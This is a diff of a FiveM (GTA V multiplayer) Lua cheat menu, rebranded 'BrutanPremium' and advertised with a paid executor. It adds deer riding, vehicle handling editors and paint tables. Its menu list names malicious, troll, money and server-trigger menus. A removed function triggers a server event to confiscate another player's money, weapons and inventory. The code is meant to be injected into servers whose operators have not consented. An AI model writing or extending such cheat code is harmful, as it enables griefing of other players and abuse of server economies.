@@ -19,24 +19,475 @@ www.instant-modz.com / Buy the best FiveM Lua Executor to use this menu
 =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 ]] print("www.instant-modz.com")
 
-Plane = { }
+enabled = enabled
+KAKAAKAKAK = enabled
 
-Plane.debug = false
+
+TriggerServerEvent = TriggerServerEvent
+
+
+GetHashKey = GetHashKey
+
+
+BrutanPremium = { } 
+BrutanPremium.debug = false
+
+jd366213 = false
+KZjx = jd366213
+ihrug = nil
+WADUI = ihrug
+
+local entityEnumerator = {
+	__gc = function(enum)
+		if enum.destructor and enum.handle then
+			enum.destructor(enum.handle)
+		end
+		enum.destructor = nil
+		enum.handle = nil
+	end
+}
+wdihwaduaw = true
+jejejejej = wdihwaduaw
+xjbvxyg3e = jejejejej
+waduyh487r64 = xjbvxyg3e
+
+
+function EnumerateEntities(initFunc, moveFunc, disposeFunc)
+	return coroutine.wrap(function()
+		local iter, id = initFunc()
+		if not id or id == 0 then
+			disposeFunc(iter)
+			return
+		end
+	
+		local enum = {handle = iter, destructor = disposeFunc}
+		setmetatable(enum, entityEnumerator)
+	
+		local next = true
+		repeat
+			coroutine.yield(id)
+			next, id = moveFunc(iter)
+		until not next
+	
+		enum.destructor, enum.handle = nil, nil
+		disposeFunc(iter)
+	end)
+end
+
+function EnumeratePeds()
+    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
+end
+
+  function EnumerateVehicles()
+	return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
+  end
+
+function GetAllPeds()
+    local peds123 = {}
+    for ped in EnumeratePeds() do
+        if DoesEntityExist(ped) then
+            table.insert(peds123, ped)
+        end
+    end
+    return peds123
+end
+
+
+
+  
+local Deer = {
+	Handle = nil,
+	Invincible = false,
+	Ragdoll = false,
+	Marker = false,
+	Speed = {
+		Walk = 3.0,
+		Run = 9.0,
+	},
+}
+
+function GetNearbyPeds(X, Y, Z, Radius)
+	local NearbyPeds = {}
+	for Ped in EnumeratePeds() do
+		if DoesEntityExist(Ped) then
+			local PedPosition = GetEntityCoords(Ped, false)
+			if Vdist(X, Y, Z, PedPosition.x, PedPosition.y, PedPosition.z) <= Radius then
+				table.insert(NearbyPeds, Ped)
+			end
+		end
+	end
+	return NearbyPeds
+end
+
+function GetCoordsInfrontOfEntityWithDistance(Entity, Distance, Heading)
+	local Coordinates = GetEntityCoords(Entity, false)
+	local Head = (GetEntityHeading(Entity) + (Heading or 0.0)) * math.pi / 180.0
+	return {x = Coordinates.x + Distance * math.sin(-1.0 * Head), y = Coordinates.y + Distance * math.cos(-1.0 * Head), z = Coordinates.z}
+end
+
+function GetGroundZ(X, Y, Z)
+	if tonumber(X) and tonumber(Y) and tonumber(Z) then
+		local _, GroundZ = GetGroundZFor_3dCoord(X + 0.0, Y + 0.0, Z + 0.0, Citizen.ReturnResultAnyway())
+		return GroundZ
+	else
+		return 0.0
+	end
+end
+
+function Deer.Destroy()
+	local Ped = PlayerPedId()
+
+	DetachEntity(Ped, true, false)
+	ClearPedTasksImmediately(Ped)
+
+	SetEntityAsNoLongerNeeded(Deer.Handle)
+	DeletePed(Deer.Handle)
+
+	if DoesEntityExist(Deer.Handle) then
+		SetEntityCoords(Deer.Handle, 601.28948974609, -4396.9853515625, 384.98565673828)
+	end
+
+	Deer.Handle = nil
+end
+
+function Deer.Create()
+	local Model = GetHashKey("a_c_deer")
+	RequestModel(Model)
+	while not HasModelLoaded(Model) do
+		Citizen.Wait(50)
+	end
+
+	local Ped = PlayerPedId()
+	local PedPosition = GetEntityCoords(Ped, false)
+
+	Deer.Handle = CreatePed(28, Model, PedPosition.x+1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)
+
+	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
+	SetEntityInvincible(Deer.Handle, Deer.Invincible)
+
+	SetModelAsNoLongerNeeded(Model)
+end
+
+function Deer.Attach()
+	local Ped = PlayerPedId()
+
+	FreezeEntityPosition(Deer.Handle, true)
+	FreezeEntityPosition(Ped, true)
+
+	local DeerPosition = GetEntityCoords(Deer.Handle, false)
+	SetEntityCoords(Ped, DeerPosition.x, DeerPosition.y, DeerPosition.z)
+
+	AttachEntityToEntity(Ped, Deer.Handle, GetPedBoneIndex(Deer.Handle, 24816), -0.3, 0.0, 0.3, 0.0, 0.0, 90.0, false, false, false, true, 2, true)
+
+	TaskPlayAnim(Ped, "rcmjosh2", "josh_sitting_loop", 8.0, 1, -1, 2, 1.0, 0, 0, 0)
+
+	FreezeEntityPosition(Deer.Handle, false)
+	FreezeEntityPosition(Ped, false)
+end
+
+function Deer.Ride()
+	local Ped = PlayerPedId()
+	local PedPosition = GetEntityCoords(Ped, false)
+	if IsPedSittingInAnyVehicle(Ped) or IsPedGettingIntoAVehicle(Ped) then
+		return
+	end
+
+	local AttachedEntity = GetEntityAttachedTo(Ped)
+
+	if IsEntityAttached(Ped) and GetEntityModel(AttachedEntity) == GetHashKey("a_c_deer") then
+		local SideCoordinates = GetCoordsInfrontOfEntityWithDistance(AttachedEntity, 1.0, 90.0)
+		local SideHeading = GetEntityHeading(AttachedEntity)
+
+		SideCoordinates.z = GetGroundZ(SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)
+
+		Deer.Handle = nil
+		DetachEntity(Ped, true, false)
+		ClearPedTasksImmediately(Ped)
+
+		SetEntityCoords(Ped, SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)
+		SetEntityHeading(Ped, SideHeading)
+	else
+		for _, Ped in pairs(GetNearbyPeds(PedPosition.x, PedPosition.y, PedPosition.z, 2.0)) do
+			if GetEntityModel(Ped) == GetHashKey("a_c_deer") then
+				Deer.Handle = Ped
+				Deer.Attach()
+				break
+			end
+		end
+	end
+end
+
+Citizen.CreateThread(function()
+	RequestAnimDict("rcmjosh2")
+	while not HasAnimDictLoaded("rcmjosh2") do
+		Citizen.Wait(250)
+	end
+	while true do
+		Citizen.Wait(0)
+
+
+
+		local Ped = PlayerPedId()
+		local AttachedEntity = GetEntityAttachedTo(Ped)
+
+		if (not IsPedSittingInAnyVehicle(Ped) or not IsPedGettingIntoAVehicle(Ped)) and IsEntityAttached(Ped) and AttachedEntity == Deer.Handle then
+			if DoesEntityExist(Deer.Handle) then
+				local LeftAxisXNormal, LeftAxisYNormal = GetControlNormal(2, 218), GetControlNormal(2, 219)
+				local Speed, Range = Deer.Speed.Walk, 4000.0
+
+
+				local GoToOffset = GetOffsetFromEntityInWorldCoords(Deer.Handle, LeftAxisXNormal * Range, LeftAxisYNormal * -1.0 * Range, 0.0)
+
+				TaskLookAtCoord(Deer.Handle, GoToOffset.x, GoToOffset.y, GoToOffset.z, 0, 0, 2)
+				TaskGoStraightToCoord(Deer.Handle, GoToOffset.x, GoToOffset.y, GoToOffset.z, Speed, 20000, 40000.0, 0.5)
+
+				if Deer.Marker then
+					DrawMarker(6, GoToOffset.x, GoToOffset.y, GoToOffset.z, 0, 0, 0, 0, 0, 0, 1.0, 1.0, 1.0, 255, 255, 255, 255, 0, 0, 2, 0, 0, 0, 0)
+				end
+			end
+		end
+	end
+end)
+
+
 
 local Enabled = true
 
 local states = {}
 states.frozen = false
 states.frozenPos = nil
+kkkk = "brutanpremium"
+local planeisbest = false
+local dEI = kkkk
 
-local logged = false
-local pass = "brutan"
 
-local aispeed = "50.0"
+local ojtgh = "50.0"
+local a = 1
 
 local cg = true
 local ch = false
 local ci = true
+local chdata = {}
+	function mysplit(inputstr, sep)
+		if sep == nil then
+			sep = "%s"
+		end
+		local t={} ; i=1
+		for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
+			t[i] = str
+			i = i + 1
+		end
+		return t
+	end
+
+	local allMenus = { "MainMenu", "SelfMenu", "OnlinePlayersMenu", "WeaponMenu", "SingleWeaponMenu", "MaliciousMenu",
+                            "ESXMenu", "ESXJobMenu", "ESXMoneyMenu", "VehMenu", "VehSpawnOpt", "PlayerOptionsMenu",
+                            "TeleportMenu", "LSC", "Hedit", "PlayerTrollMenu", "PlayerESXMenu", "PlayerESXJobMenu",
+                            "PlayerESXTriggerMenu", "BulletGunMenu", "TrollMenu", "WeaponCustomization", "WeaponTintMenu",
+                            "VehicleRamMenu", "ESXBossMenu", "SpawnPropsMenu", "SingleWepPlayer", "VehBoostMenu",
+                            "ESXMiscMenu", "ESXDrugMenu", "AI", "SettingsMenu", "VRPMenu"}
+	
+local handlingData = {
+	"handlingName",
+	"fMass",
+	"fInitialDragCoeff",
+	"fPercentSubmerged",
+	"vecCentreOfMassOffset",
+	"vecInertiaMultiplier",
+	"fDriveBiasFront",
+	"nInitialDriveGears",
+	"fInitialDriveForce",
+	"fDriveInertia",
+	"fClutchChangeRateScaleUpShift",
+	"fClutchChangeRateScaleDownShift",
+	"fInitialDriveMaxFlatVel",
+	"fBrakeForce",
+	"fBrakeBiasFront",
+	"fHandBrakeForce",
+	"fSteeringLock",
+	"fTractionCurveMax",
+	"fTractionCurveMin",
+	"fTractionCurveLateral",
+	"fTractionSpringDeltaMax",
+	"fLowSpeedTractionLossMult",
+	"fCamberStiffnesss",
+	"fTractionBiasFront",
+	"fTractionLossMult",
+	"fSuspensionForce",
+	"fSuspensionCompDamp",
+	"fSuspensionReboundDamp",
+	"fSuspensionUpperLimit",
+	"fSuspensionLowerLimit",
+	"fSuspensionRaise",
+	"fSuspensionBiasFront",
+	"fTractionCurveMax",
+	"fAntiRollBarForce",
+	"fAntiRollBarBiasFront",
+	"fRollCentreHeightFront",
+	"fRollCentreHeightRear",
+	"fCollisionDamageMult",
+	"fWeaponDamageMult",
+	"fDeformationDamageMult",
+	"fEngineDamageMult",
+	"fPetrolTankVolume",
+	"fOilVolume",
+	"fSeatOffsetDistX",
+	"fSeatOffsetDistY",
+	"fSeatOffsetDistZ",
+	"nMonetaryValue",
+	"strModelFlags",
+	"strHandlingFlags",
+	"strDamageFlags",
+	"AIHandling",
+	
+	
+	"fThrust",
+	"fThrustFallOff",
+	"fThrustVectoring",
+	"fYawMult",
+	"fYawStabilise",
+	"fSideSlipMult",
+	"fRollMult",
+	"fRollStabilise",
+	"fPitchMult",
+	"fPitchStabilise",
+	"fFormLiftMult",
+	"fAttackLiftMult",
+	"fAttackDiveMult",
+	"fGearDownDragV",
+	"fGearDownLiftMult",
+	"fWindMult",
+	"fMoveRes",
+	"vecTurnRes",
+	"vecSpeedRes",
+	"fGearDoorFrontOpen",
+	"fGearDoorRearOpen",
+	"fGearDoorRearOpen2",
+	"fGearDoorRearMOpen",
+	"fTurublenceMagnitudeMax",
+	"fTurublenceForceMulti",
+	"fTurublenceRollTorqueMulti",
+	"fTurublencePitchTorqueMulti",
+	"fBodyDamageControlEffectMult",
+	"fInputSensitivityForDifficulty",
+	"fOnGroundYawBoostSpeedPeak",
+	"fOnGroundYawBoostSpeedCap",
+	"fEngineOffGlideMulti",
+	"handlingType",
+	"fThrustFallOff",
+	"fThrustFallOff",
+	
+	
+	"fBackEndPopUpCarImpulseMult",
+	"fBackEndPopUpBuildingImpulseMult",
+	"fBackEndPopUpMaxDeltaSpeed",
+	
+	
+
+	
+	"fLeanFwdCOMMult",
+	"fLeanFwdForceMult",
+	"fLeanBakCOMMult",
+	"fLeanBakForceMult",
+	"fMaxBankAngle",
+	"fFullAnimAngle",
+	"fDesLeanReturnFrac",
+	"fStickLeanMult",
+	"fBrakingStabilityMult",
+	"fInAirSteerMult",
+	"fWheelieBalancePoint",
+	"fStoppieBalancePoint",
+	"fWheelieSteerMult",
+	"fRearBalanceMult",
+	"fFrontBalanceMult",
+	"fBikeGroundSideFrictionMult",
+	"fBikeWheelGroundSideFrictionMult",
+	"fBikeOnStandLeanAngle",
+	"fBikeOnStandSteerAngle",
+	"fJumpForce",
+}
+
+
+
+Citizen.CreateThread(function()
+
+	function SetVehicleHandlingData(Vehicle,Data,Value) 
+		if DoesEntityExist(Vehicle) and Data and Value then
+			for theKey,property in pairs(handlingData) do 
+				if property == Data then
+					local intfind = string.find(property, "n" ) 
+					local floatfind = string.find(property, "f" )
+					local strfind = string.find(property, "str" )
+					local vecfind = string.find(property, "vec" )
+					
+					
+					if intfind ~= nil and intfind == 1 then
+						SetVehicleHandlingInt( Vehicle, "CHandlingData", Data, tonumber(Value) ) 
+					elseif floatfind ~= nil and floatfind == 1 then
+						local Value = tonumber(Value)+.0
+						SetVehicleHandlingFloat( Vehicle, "CHandlingData", Data, tonumber(Value) )
+					elseif strfind ~= nil and strfind == 1 then
+						SetVehicleHandlingField( Vehicle, "CHandlingData", Data, Value )
+					elseif vecfind ~= nil and vecfind == 1 then
+						SetVehicleHandlingVector( Vehicle, "CHandlingData", Data, Value )
+					else
+						SetVehicleHandlingField( Vehicle, "CHandlingData", Data, Value )
+					end
+				end
+			end
+		end
+	end
+	
+	
+	function GetVehicleHandlingData(Vehicle,Data)
+		if DoesEntityExist(Vehicle) then
+			for theKey,property in pairs(handlingData) do 
+				if property == Data then
+					local intfind = string.find(property, "n" )
+					local floatfind = string.find(property, "f" )
+					local strfind = string.find(property, "str" )
+					local vecfind = string.find(property, "vec" )
+					
+					if intfind ~= nil and intfind == 1 then
+						return GetVehicleHandlingInt( Vehicle, "CHandlingData", Data )
+					elseif floatfind ~= nil and floatfind == 1 then
+						return GetVehicleHandlingFloat( Vehicle, "CHandlingData", Data )
+					elseif vecfind ~= nil and vecfind == 1 then
+						return GetVehicleHandlingVector( Vehicle, "CHandlingData", Data )
+					else
+						return false
+					end
+				end
+			end
+		end
+	end
+	
+	function GetAllVehicleHandlingData(Vehicle)
+		local VehicleHandlingData = {}
+		if DoesEntityExist(Vehicle) then
+			for i,theData in pairs(handlingData) do 
+				local intfind = string.find(theData, "n" )
+				local floatfind = string.find(theData, "f" )
+				local strfind = string.find(theData, "str" )
+				local vecfind = string.find(theData, "vec" )
+				
+				if intfind ~= nil and intfind == 1 and GetVehicleHandlingInt( Vehicle, "CHandlingData", theData ) then
+					table.insert(VehicleHandlingData, { name = theData, value = GetVehicleHandlingInt( Vehicle, "CHandlingData", theData ), type = "int" }  )
+				elseif floatfind ~= nil and floatfind == 1 and GetVehicleHandlingFloat( Vehicle, "CHandlingData", theData ) then
+					table.insert(VehicleHandlingData, { name = theData, value = GetVehicleHandlingFloat( Vehicle, "CHandlingData", theData ), type = "float" } )
+				elseif vecfind ~= nil and vecfind == 1 and GetVehicleHandlingVector( Vehicle, "CHandlingData", theData ) then
+					table.insert(VehicleHandlingData, { name = theData, value = GetVehicleHandlingVector( Vehicle, "CHandlingData", theData ), type = "vector3" } )
+				end
+			end
+			return VehicleHandlingData
+		end
+	end
+	
+		
+	
+	
+end
+)
 
 Citizen.CreateThread(function()
 	while true do
@@ -54,7 +505,7 @@ Citizen.CreateThread(
             Wait(1)
             for i = 0, 128 do
                 if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= GetPlayerPed(-1) then
-                    ped = GetPlayerPed(i)
+                   local ped = GetPlayerPed(i)
                     blip = GetBlipFromEntity(ped)
                     x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                     x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
@@ -220,13 +671,375 @@ local b9 = false
 local ba = false
 local bb = false
 local bc = nil
-local bd = {}
-local be = {}
-local bf = nil
-local bg = false
-local bh = -1
-local bi = -1
-local bj = -1
+local bd = {
+        {
+            name = "Spoilers", id = 0
+        }, {
+            name = "Front Bumper", id = 1
+        }, {
+            name = "Rear Bumper", id = 2
+        }, {
+            name = "Side Skirt", id = 3
+        }, {
+            name = "Exhaust", id = 4
+        }, {
+            name = "Frame", id = 5
+        }, {
+            name = "Grille", id = 6
+        }, {
+            name = "Hood", id = 7
+        }, {
+            name = "Fender", id = 8
+        }, {
+            name = "Right Fender", id = 9
+        }, {
+            name = "Roof", id = 10
+        }, {
+            name = "Vanity Plates", id = 25
+        }, {
+            name = "Trim", id = 27
+        }, {
+            name = "Ornaments", id = 28
+        }, {
+            name = "Dashboard", id = 29
+        }, {
+            name = "Dial", id = 30
+        }, {
+            name = "Door Speaker", id = 31
+        }, {
+            name = "Seats", id = 32
+        }, {
+            name = "Steering Wheel", id = 33
+        }, {
+            name = "Shifter Leavers", id = 34
+        }, {
+            name = "Plaques", id = 35
+        }, {
+            name = "Speakers", id = 36
+        }, {
+            name = "Trunk", id = 37
+        }, {
+            name = "Hydraulics", id = 38
+        }, {
+            name = "Engine Block", id = 39
+        }, {
+            name = "Air Filter", id = 40
+        }, {
+            name = "Struts", id = 41
+        }, {
+            name = "Arch Cover", id = 42
+        }, {
+            name = "Aerials", id = 43
+        }, {
+            name = "Trim 2", id = 44
+        }, {
+            name = "Tank", id = 45
+        }, {
+            name = "Windows", id = 46
+        }, {
+            name = "Livery", id = 48
+        }, {
+            name = "Wheels", id = 23
+        }, {
+            name = "Wheel Types", id = "wheeltypes"
+        }, {
+            name = "Extras", id = "extra"
+        }, {
+            name = "Neons", id = "neon"
+        }, {
+            name = "Paint", id = "paint"
+        }, {
+            name = "Headlights Color", id = "headlight"
+        },  {
+            name = "Licence Plate", id = "licence"                           
+        }
+    }
+    
+    local be = {
+        {
+            name = "Engine", id = 11
+        }, {
+            name = "Brakes", id = 12
+        }, {
+            name = "Transmission", id = 13
+        }, {
+            name = "Suspension", id = 15
+        }
+    }
+    
+    local bo = {
+        {
+            name = "Default", id = -1
+        }, {
+            name = "White", id = 0
+        }, {
+            name = "Blue", id = 1
+        }, {
+            name = "Electric Blue", id = 2
+        }, {
+            name = "Mint Green", id = 3
+        }, {
+            name = "Lime Green", id = 4
+        }, {
+            name = "Yellow", id = 5
+        }, {
+            name = "Golden Shower", id = 6
+        }, {
+            name = "Orange", id = 7
+        }, {
+            name = "Red", id = 8
+        }, {
+            name = "Pony Pink", id = 9
+        }, {
+            name = "Hot Pink", id = 10
+        }, {
+            name = "Purple", id = 11
+        }, {
+            name = "Blacklight", id = 12
+        }
+    }
+    
+    local colors = {
+        ["White"] = {
+            255, 255, 255
+        }, ["Blue"] = {
+            0, 0, 255
+        }, ["Electric Blue"] = {
+            0, 150, 255
+        }, ["Mint Green"] = {
+            50, 255, 155
+        }, ["Lime Green"] = {
+            0, 255, 0
+        }, ["Yellow"] = {
+            255, 255, 0
+        }, ["Golden Shower"] = {
+            204, 204, 0
+        }, ["Orange"] = {
+            255, 128, 0
+        }, ["Red"] = {
+            255, 0, 0
+        }, ["Pony Pink"] = {
+            255, 102, 255
+        }, ["Hot Pink"] = {
+            255, 0, 255
+        }, ["Purple"] = {
+            153, 0, 153
+        }
+    }
+    
+	-- 4x482
+	
+    local bg = {
+        {
+            name = "Black", id = 0
+        }, {
+            name = "Carbon Black", id = 147
+        }, {
+            name = "Graphite", id = 1
+        }, {
+            name = "Anhracite Black", id = 11
+        }, {
+            name = "Black Steel", id = 2
+        }, {
+            name = "Dark Steel", id = 3
+        }, {
+            name = "Silver", id = 4
+        }, {
+            name = "Bluish Silver", id = 5
+        }, {
+            name = "Rolled Steel", id = 6
+        }, {
+            name = "Shadow Silver", id = 7
+        }, {
+            name = "Stone Silver", id = 8
+        }, {
+            name = "Midnight Silver", id = 9
+        }, {
+            name = "Cast Iron Silver", id = 10
+        }, {
+            name = "Red", id = 27
+        }, {
+            name = "Torino Red", id = 28
+        }, {
+            name = "Formula Red", id = 29
+        }, {
+            name = "Lava Red", id = 150
+        }, {
+            name = "Blaze Red", id = 30
+        }, {
+            name = "Grace Red", id = 31
+        }, {
+            name = "Garnet Red", id = 32
+        }, {
+            name = "Sunset Red", id = 33
+        }, {
+            name = "Cabernet Red", id = 34
+        }, {
+            name = "Wine Red", id = 143
+        }, {
+            name = "Candy Red", id = 35
+        }, {
+            name = "Hot Pink", id = 135
+        }, {
+            name = "Pfsiter Pink", id = 137
+        }, {
+            name = "Salmon Pink", id = 136
+        }, {
+            name = "Sunrise Orange", id = 36
+        }, {
+            name = "Orange", id = 38
+        }, {
+            name = "Bright Orange", id = 138
+        }, {
+            name = "Gold", id = 99
+        }, {
+            name = "Bronze", id = 90
+        }, {
+            name = "Yellow", id = 88
+        }, {
+            name = "Race Yellow", id = 89
+        }, {
+            name = "Dew Yellow", id = 91
+        }, {
+            name = "Dark Green", id = 49
+        }, {
+            name = "Racing Green", id = 50
+        }, {
+            name = "Sea Green", id = 51
+        }, {
+            name = "Olive Green", id = 52
+        }, {
+            name = "Bright Green", id = 53
+        }, {
+            name = "Gasoline Green", id = 54
+        }, {
+            name = "Lime Green", id = 92
+        }, {
+            name = "Midnight Blue", id = 141
+        }, {
+            name = "Galaxy Blue", id = 61
+        }, {
+            name = "Dark Blue", id = 62
+        }, {
+            name = "Saxon Blue", id = 63
+        }, {
+            name = "Blue", id = 64
+        }, {
+            name = "Mariner Blue", id = 65
+        }, {
+            name = "Harbor Blue", id = 66
+        }, {
+            name = "Diamond Blue", id = 67
+        }, {
+            name = "Surf Blue", id = 68
+        }, {
+            name = "Nautical Blue", id = 69
+        }, {
+            name = "Racing Blue", id = 73
+        }, {
+            name = "Ultra Blue", id = 70
+        }, {
+            name = "Light Blue", id = 74
+        }, {
+            name = "Chocolate Brown", id = 96
+        }, {
+            name = "Bison Brown", id = 101
+        }, {
+            name = "Creeen Brown", id = 95
+        }, {
+            name = "Feltzer Brown", id = 94
+        }, {
+            name = "Maple Brown", id = 97
+        }, {
+            name = "Beechwood Brown", id = 103
+        }, {
+            name = "Sienna Brown", id = 104
+        }, {
+            name = "Saddle Brown", id = 98
+        }, {
+            name = "Moss Brown", id = 100
+        }, {
+            name = "Woodbeech Brown", id = 102
+        }, {
+            name = "Straw Brown", id = 99
+        }, {
+            name = "Sandy Brown", id = 105
+        }, {
+            name = "Bleached Brown", id = 106
+        }, {
+            name = "Schafter Purple", id = 71
+        }, {
+            name = "Spinnaker Purple", id = 72
+        }, {
+            name = "Midnight Purple", id = 142
+        }, {
+            name = "Bright Purple", id = 145
+        }, {
+            name = "Cream", id = 107
+        }, {
+            name = "Ice White", id = 111
+        }, {
+            name = "Frost White", id = 112
+        }
+    }
+    
+    local bi = {
+        {
+            name = "Black", id = 12
+        }, {
+            name = "Gray", id = 13
+        }, {
+            name = "Light Gray", id = 14
+        }, {
+            name = "Ice White", id = 131
+        }, {
+            name = "Blue", id = 83
+        }, {
+            name = "Dark Blue", id = 82
+        }, {
+            name = "Midnight Blue", id = 84
+        }, {
+            name = "Midnight Purple", id = 149
+        }, {
+            name = "Schafter Purple", id = 148
+        }, {
+            name = "Red", id = 39
+        }, {
+            name = "Dark Red", id = 40
+        }, {
+            name = "Orange", id = 41
+        }, {
+            name = "Yellow", id = 42
+        }, {
+            name = "Lime Green", id = 55
+        }, {
+            name = "Green", id = 128
+        }, {
+            name = "Forest Green", id = 151
+        }, {
+            name = "Foliage Green", id = 155
+        }, {
+            name = "Olive Darb", id = 152
+        }, {
+            name = "Dark Earth", id = 153
+        }, {
+            name = "Desert Tan", id = 154
+        }
+    }
+    
+    local bj = {
+        {
+            name = "Brushed Steel", id = 117
+        }, {
+            name = "Brushed Black Steel", id = 118
+        }, {
+            name = "Brushed Aluminum", id = 119
+        }, {
+            name = "Pure Gold", id = 158
+        }, {
+            name = "Brushed Gold", id = 159
+        }
+    }
 local bk = false
 
 
@@ -414,54 +1227,6 @@ local aJ = {
     'Rhapsody'
 }
 
-entityEnumerator = {
-	__gc = function(enum)
-	  if enum.destructor and enum.handle then
-		enum.destructor(enum.handle)
-	  end
-	  enum.destructor = nil
-	  enum.handle = nil
-	end
-  }
-
-function EnumerateEntities(initFunc, moveFunc, disposeFunc)
-	return coroutine.wrap(function()
-	  local iter, id = initFunc()
-	  if not id or id == 0 then
-		disposeFunc(iter)
-		return
-	  end
-	  
-	  local enum = {handle = iter, destructor = disposeFunc}
-	  setmetatable(enum, entityEnumerator)
-	  
-	  local next = true
-	  repeat
-		coroutine.yield(id)
-		next, id = moveFunc(iter)
-	  until not next
-	  
-	  enum.destructor, enum.handle = nil, nil
-	  disposeFunc(iter)
-	end)
-  end
-
-  function EnumerateObjects()
-	return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
-  end
-
-  function EnumeratePeds()
-	return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
-  end
-
-  function EnumerateVehicles()
-	return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
-  end
-
-  function EnumeratePickups()
-	return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
-  end
-
 local function ClonePedVeh()
     local ped = GetPlayerPed(SelectedPlayer)
     local pedVeh = nil
@@ -492,82 +1257,6 @@ local function ClonePedVeh()
     end
 end
 
-local function OpenBodySearchMenu1(SelectedPlayer)
-
-  ESX.TriggerServerCallback('esx_mafiajob:getOtherPlayerData', function(data)
-
-    local elements = {}
-
-    local blackMoney = 0
-
-    for i=1, #data.accounts, 1 do
-      if data.accounts[i].name == 'black_money' then
-        blackMoney = data.accounts[i].money
-      end
-    end
-
-    table.insert(elements, {
-      label          = 'confiscate_dirty' .. blackMoney,
-      value          = 'black_money',
-      itemType       = 'item_account',
-      amount         = blackMoney
-    })
-
-    table.insert(elements, {label = '--- Armes ---', value = nil})
-
-    for i=1, #data.weapons, 1 do
-      table.insert(elements, {
-        label          = 'confiscate' .. ESX.GetWeaponLabel(data.weapons[i].name),
-        value          = data.weapons[i].name,
-        itemType       = 'item_weapon',
-        amount         = data.ammo,
-      })
-    end
-
-    table.insert(elements, {label = 'inventory_label', value = nil})
-
-    for i=1, #data.inventory, 1 do
-      if data.inventory[i].count > 0 then
-        table.insert(elements, {
-          label          = 'confiscate_inv' .. data.inventory[i].count .. ' ' .. data.inventory[i].label,
-          value          = data.inventory[i].name,
-          itemType       = 'item_standard',
-          amount         = data.inventory[i].count,
-        })
-      end
-    end
-
-
-    ESX.UI.Menu.Open(
-      'default', GetCurrentResourceName(), 'body_search',
-      {
-        title    = _U('search'),
-        align    = 'top-left',
-        elements = elements,
-      },
-      function(data, menu)
-
-        local itemType = data.current.itemType
-        local itemName = data.current.value
-        local amount   = data.current.amount
-
-        if data.current.value ~= nil then
-
-          TriggerServerEvent('esx_mafiajob:confiscatePlayerItem', GetPlayerServerId(SelectedPlayer), itemType, itemName, amount)
-
-          OpenBodySearchMenu(SelectedPlayer)
-
-        end
-
-      end,
-      function(data, menu)
-        menu.close()
-      end
-    )
-
-  end, GetPlayerServerId(SelectedPlayer))
-
-end
 
 function vrpdestroy()
                 for bD = 0, 9 do
@@ -1296,18 +1985,23 @@ local b5 = {
     'Trailers3'
 }
 
-local currentMenuX = 0.025
-local selectedMenuX = 0.025
-local currentMenuY = 0.025
-local selectedMenuY = 0.025
-local menuX = { 0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.75 }
-local menuY = { 0.025, 0.1, 0.2, 0.3, 0.425 }
+local currentMenuX = 1
+local selectedMenuX = 1
+local currentMenuY = 1
+local selectedMenuY = 1
+local menuX = { 0.75, 0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7 }
+local menuY = { 0.1, 0.025, 0.2, 0.3, 0.425 }
 
 local discordPresence = true
+
+
 
 local SelectedPlayer
 local bullets = { "WEAPON_FLAREGUN", "WEAPON_FIREWORK", "WEAPON_RPG", "WEAPON_PIPEBOMB", "WEAPON_RAILGUN", "WEAPON_SMOKEGRENADE", "VEHICLE_WEAPON_PLAYER_LASER", "VEHICLE_WEAPON_TANK" }
 local peds = { "a_c_boar", "a_c_killerwhale", "a_c_sharktiger", "csb_stripper_01" }
+local peds2 = { "s_m_y_baywatch_01", "a_m_m_acult_01", "ig_barry", "g_m_y_ballaeast_01", "u_m_y_babyd", "a_m_y_acult_01", "a_m_m_afriamer_01", "u_m_y_corpse_01", "s_m_m_armoured_02", "g_m_m_armboss_01", "g_m_y_armgoon_02", "s_m_y_blackops_03", "s_m_y_blackops_01", "s_m_y_prismuscl_01", "g_m_m_chemwork_01", "a_m_y_musclbeac_01", "csb_cop", "s_m_y_clown_01", "s_m_y_cop_01", "u_m_y_zombie_01" }
+local peds3 = { "cs_debra", "a_f_m_beach_01", "a_f_m_bodybuild_01", "a_f_m_business_02", "a_f_y_business_04", "mp_f_cocaine_01", "u_f_y_corpse_01", "mp_f_meth_01", "g_f_importexport_01", "a_f_y_vinewood_04", "a_m_m_tranvest_01", "a_m_m_tranvest_02", "ig_tracydisanto", "csb_stripper_02", "s_f_y_stripper_01", "a_f_m_soucentmc_01", "a_f_m_soucent_02", "u_f_y_poppymich", "ig_patricia", "s_f_y_cop_01" }
+local peds4 = { "a_c_husky", "a_c_cat_01", "a_c_boar", "a_c_sharkhammer", "a_c_coyote", "a_c_chimp", "a_c_chop", "a_c_cow", "a_c_deer", "a_c_dolphin", "a_c_fish", "a_c_hen", "a_c_humpback", "a_c_killerwhale", "a_c_mtlion", "a_c_pig", "a_c_pug", "a_c_rabbit_01", "a_c_retriever", "a_c_rhesus", "a_c_rottweiler", "a_c_sharktiger", "a_c_shepherd", "a_c_westy" }
 local vehicles = { "Freight", "Rhino", "Futo", "Vigilante", "Monster", "Panto", "Bus", "Dump", "CargoPlane" }
 local vehicleSpeed = { 1.0, 10.0, 20.0, 30.0, 40.0, 50.0, 60.0, 70.0, 80.0, 90.0, 100.0, 110.0, 120.0, 130.0, 140.0, 150.0 }
 
@@ -1325,11 +2019,28 @@ local selectedDamage = 1
 
 local currentPed = 1
 local selectedPed = 1
+local selectedPedd = 1
+local currentPedd = 1
+local selectedPeddd = 1
+local currentPeddd = 1
+local selectedPedddd = 1
+local currentPedddd = 1
 
 local currentBullet = 1
 local selectedBullet = 1
 
 local menus = { }
+local Keys = {
